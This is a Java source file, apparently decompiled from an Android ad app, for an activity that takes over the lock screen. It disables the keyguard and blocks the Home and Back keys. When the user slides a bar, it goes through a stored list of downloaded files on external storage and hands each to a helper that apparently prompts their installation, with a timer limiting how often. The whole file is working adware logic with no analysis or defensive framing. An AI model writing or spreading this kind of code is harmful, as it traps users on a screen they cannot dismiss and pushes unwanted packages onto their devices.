package com.bangbang.ads.android;
import java.io.File;
import java.util.HashMap;
import java.util.Iterator;
import workspace.callback.TriggerListener;
import workspace.shortcut.ShortcutUtil;
import workspace.util.MyLogger;
import workspace.util.WUtil;
import android.app.Activity;
import android.app.KeyguardManager;
import android.content.SharedPreferences;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.view.KeyEvent;
import android.widget.RelativeLayout;

public class WmfActivity extends Activity implements TriggerListener {
    static WmfActivity instance = null;
    public static void b() {
        new Handler().post(new Runnable() {
            @Override
            public void run() {
                if (instance != null) {
                    instance.finish();
                    ((KeyguardManager) instance.getSystemService("keyguard")).newKeyguardLock("my_lockscreen").reenableKeyguard();
                }
            }
        });
    }
    private void d() {
        ((SlideBar) findViewById(workspace.util.AR.id.slideBar)).setOnTriggerListener(this);
        f();
        e();
    }
    private void e() {
        WUtil.a(this, (RelativeLayout) findViewById(workspace.util.AR.id.RL));
    }
    @SuppressWarnings("deprecation")
    private void f() {
        ((KeyguardManager) getSystemService("keyguard")).newKeyguardLock("my_lockscreen").disableKeyguard();
    }
    @Override
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        instance = this;
        requestWindowFeature(1);
        setContentView(workspace.util.AR.layout.ls);
        d();
    }
    @Override
    public boolean onKeyDown(int i, KeyEvent keyevent) {
        if (keyevent.getKeyCode() == 3) { return true; }
        if (keyevent.getKeyCode() == 4) {
            return true;
        } else {
            return super.onKeyDown(i, keyevent);
        }
    }
    @Override
    public void onTrigger() {
        finish();
        openUninstallFile();
    }
    private void openUninstallFile() {
        MyLogger.info("info", "openUninstallFile");
        try {
            String s = getPackageManager().getPackageInfo(getPackageName(), 0).packageName;
            File file = new File(new StringBuilder(String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath())).append("/").append(s).toString());
            SharedPreferences sharedpreferences = getSharedPreferences("downLoadFileName", 0);
            android.content.SharedPreferences.Editor editor = sharedpreferences.edit();
            HashMap hashmap = (HashMap) sharedpreferences.getAll();
            Iterator iterator = hashmap.entrySet().iterator();
            long l = sharedpreferences.getLong("preTime", 0L);
            long l1 = Math.abs(System.currentTimeMillis() - l) / 0x36ee80L;
            int i = sharedpreferences.getInt("times", 0);
            if (i != 0 && l1 < 4L) { return; }
            if (hashmap.size() <= 3) { return; }
            //_L2:
            while (iterator.hasNext()) {
                java.util.Map.Entry entry = (java.util.Map.Entry) iterator.next();
                String s1 = (String) entry.getKey();
                if (!s1.equals("isFirst") && !s1.equals("times") && !s1.equals("preTime")) {
                    String s2 = (String) entry.getValue();
                    File file1 = new File(new StringBuilder().append(file).append("/").append(s2).toString());
                    if (!ShortcutUtil.methodC(this, s1) && file1.exists()) {
                        editor.putLong("preTime", System.currentTimeMillis());
                        editor.putInt("times", i + 1);
                        editor.commit();
                        ShortcutUtil.methodB(this, file1, s1);
                    }
                }
            }
            editor.putLong("preTime", System.currentTimeMillis());
            editor.commit();
        } catch (NameNotFoundException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }
}
